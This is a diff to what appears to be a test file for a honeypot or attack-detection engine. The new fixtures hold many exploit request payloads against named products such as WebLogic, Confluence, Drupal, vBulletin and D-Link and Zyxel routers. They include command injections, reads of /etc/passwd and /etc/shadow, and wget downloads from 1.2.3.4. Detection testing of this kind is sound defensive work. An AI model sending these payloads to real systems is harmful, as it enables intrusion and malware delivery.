@@ -65,6 +65,46 @@ POSITIVE = {
     "draytek-vigor": http("/cgi-bin/mainfunction.cgi", "POST", body="action=login&keyPath=%27%0A%2fbin%2fid%0A%27&loginUser=a&loginPwd=a"),
     "jenkins-cli-file-read": http("/cli?remoting=false", "POST", headers={"Session": "x", "Side": "download"}),
     "geoserver-ognl": http("/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')"),
+    "weblogic-console-traversal": http("/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession"),
+    "weblogic-wls-wsat": http("/wls-wsat/CoordinatorPortType", "POST", headers={"Content-Type": "text/xml"}, body="<java><object class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>/bin/sh</string></void></array></object></java>"),
+    "weblogic-async": http("/_async/AsyncResponseService", "POST", headers={"Content-Type": "text/xml"}, body="<wsa:Action>xx</wsa:Action><work:WorkContext>"),
+    "jenkins-descriptor-groovy": http("/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=x"),
+    "teamcity-auth-bypass": http("/hax?jsp=/app/rest/users;.jsp", "POST"),
+    "teamcity-rpc2-token": http("/app/rest/users/id:1/tokens/RPC2", "POST"),
+    "gitlab-exiftool": http("/uploads/user", "POST", body='Content-Disposition: form-data; name="file"; filename="x.jpg"\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM'),
+    "spring-cloud-gateway": http("/actuator/gateway/routes/hacktest", "POST", body='{"id":"x","filters":[{"name":"AddResponseHeader","args":{"value":"#{new java.lang.ProcessBuilder(\\"id\\").start()}"}}]}'),
+    "spring-cloud-function": http("/functionRouter", "POST", headers={"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"id\")"}),
+    "ofbiz-auth-bypass": http("/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"),
+    "ofbiz-programexport": http("/webtools/control/main/ProgramExport", "POST", body="groovyProgram=throw+new+Exception('id'.execute().text);"),
+    "nacos-auth-bypass": http("/nacos/v1/auth/users?username=x&password=x", "POST", headers={"User-Agent": "Nacos-Server"}),
+    "sap-netweaver-upload": http("/developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1", "POST", body="PK\x03\x04"),
+    "confluence-widget-connector": http("/rest/tinymce/1/macro/preview", "POST", body='{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.youtube.com/watch?v=x","_template":"file:///etc/passwd"}}}'),
+    "confluence-setup-reset": http("/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"),
+    "sharepoint-toolshell": http("/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx", "POST", headers={"Referer": "/_layouts/SignOut.aspx"}),
+    "drupalgeddon2": http("/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax", "POST", body="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id"),
+    "vbulletin-widget-php": http("/index.php?routestring=ajax/render/widget_php", "POST", body="widgetConfig[code]=echo shell_exec('id'); exit;"),
+    "vbulletin-tabbedcontainer": http("/ajax/render/widget_tabbedcontainer_tab_panel", "POST", body="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();"),
+    "craftcms-conditions": http("/index.php", "POST", body="action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\"}"),
+    "joomla-config-leak": http("/api/index.php/v1/config/application?public=true"),
+    "glpi-htmlawed": http("/vendor/htmlawed/htmlawed/htmLawedTest.php", "POST", body="sid=x&hhook=exec&text=id"),
+    "thinkphp-lang-pearcmd": http("/index.php?+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/x.php"),
+    "metabase-setup-validate": http("/api/setup/validate", "POST", body='{"token":"x","details":{"details":{"db":"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER x"}}}'),
+    "papercut-setup-bypass": http("/app?service=page/SetupCompleted"),
+    "langflow-validate-code": http("/api/v1/validate/code", "POST", body='{"code":"@exec(\\"import os; os.system(\'id\')\\")\\ndef foo():\\n  pass"}'),
+    "crushftp-ssti": http("/WebInterface/function/?command=zip&c2f=x&path={working_dir}&names=<INCLUDE>/etc/passwd</INCLUDE>", "POST"),
+    "rejetto-hfs-template": http("/?n=%0A&cmd=id&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}"),
+    "apache-mod-proxy-ssrf": http("/?unix:" + "A" * 5000 + "|http://example.com/"),
+    "cisco-asa-traversal": http("/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"),
+    "checkpoint-file-read": http("/clients/MyCRL", "POST", body="aCSHELL/../../../../../../../etc/shadow"),
+    "citrix-bleed-2": http("/p/u/doAuthentication.do", "POST", body="login"),
+    "fortiweb-path-traversal": http("/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi", "POST"),
+    "ivanti-epmm-auth-bypass": http("/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"),
+    "dlink-hnap-soapaction": http("/HNAP1/", "POST", headers={"SOAPAction": "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp && wget http://1.2.3.4/x`"}),
+    "dlink-nas-sharing": http("/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ="),
+    "dlink-dns-system-mgr": http("/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_get_ntp_server&f_ntp_server=`id`"),
+    "zyxel-viewlog": http("/cgi-bin/ViewLog.asp", "POST", body="remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=;cd+/tmp;wget+http://1.2.3.4/x;#"),
+    "tenda-usbunload": http("/goform/setUsbUnload/.js", "POST", body="deviceName=;wget http://1.2.3.4/x"),
+    "avtech-factory-brightness": http("/cgi-bin/supervisor/Factory.cgi", "POST", body="action=white_led&brightness=$(id)"),
     # recon / generic tags
     "env-file": http("/.env"),
     "git-exposure": http("/.git/config"),
@@ -77,6 +117,11 @@ POSITIVE = {
     "path-traversal-generic": http("/static/../../../../etc/passwd"),
     "scanner-ua": http("/", headers={"User-Agent": "Mozilla/5.0 zgrab/0.x"}),
     "sql-injection-generic": http("/item.php?id=1 UNION ALL SELECT NULL,NULL--"),
+    "mcp-server-probe": http("/mcp"),
+    "open-proxy-probe": http("http://a7x.example.biz/hachk.php"),
+    "vpn-portal-recon": http("/+CSCOE+/logon.html"),
+    "tr064-ntp-injection": http("/UD/act?1", "POST", headers={"SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers"}, body="<u:SetNTPServers><NewNTPServer1>`cd /tmp;wget http://1.2.3.4/x`</NewNTPServer1></u:SetNTPServers>"),
+    "pearcmd-lfi": http("/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/x.php"),
     # exposed services
     "redis-lua-sandbox-escape": shell("eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); return f:read(\"*a\")' 0"),
     "es-groovy-sandbox-bypass": http("/_search?pretty", "POST", body='{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"id\\").getText()"}}}'),
@@ -107,6 +152,9 @@ BENIGN = [
     http("/search?q=how+to+configure+log4j"),
     http("/login", "POST", body="username=alice&password=hunter2"),
     http("/wp-login.php"),  # GET is recon at most, not brute force
+    http("/docs/mcp-overview"),
+    http("/index.php?lang=en"),
+    http("/static/app.config.js"),
     shell("ls -la"),
 ]
 
@@ -170,3 +218,30 @@ def test_login_events_map_to_brute_force_and_valid_accounts():
     assert ENGINE.map_techniques(ev) == ["T1110.001"]
     ev.login_success = True
     assert ENGINE.map_techniques(ev) == ["T1078"]
+
+
+# Paths our sensors actually received before these tags existed: each must now be classified.
+OBSERVED = {
+    "/mcp/": "mcp-server-probe",
+    "/sse": "mcp-server-probe",
+    "/api/mcp": "mcp-server-probe",
+    "/phpMyAdmin-5.2.1-all-languages/index.php": "admin-panel-probe",
+    "/_phpMyAdmin/index.php": "admin-panel-probe",
+    "/2phpmyadmin/index.php": "admin-panel-probe",
+    "/pmahomme/index.php": "admin-panel-probe",
+    "/mysql/sqlmanager/index.php": "admin-panel-probe",
+    "/db/phpMyAdmin-3/index.php": "admin-panel-probe",
+    "/.ssh/id_ed25519": "secret-file-probe",
+    "/.dockercfg": "secret-file-probe",
+    "/sendgrid.env": "secret-file-probe",
+    "/appsettings.json": "secret-file-probe",
+    "/parameters.yml": "secret-file-probe",
+    "http://a7x.overflow.biz/hachk.php": "proxy-probe",
+    "/remote/login": "vpn-portal-recon",
+}
+
+
+@pytest.mark.parametrize("path,tag", sorted(OBSERVED.items()))
+def test_observed_recon_is_tagged(path, tag):
+    _, tags = ENGINE.match_signatures(http(path))
+    assert tag in tags
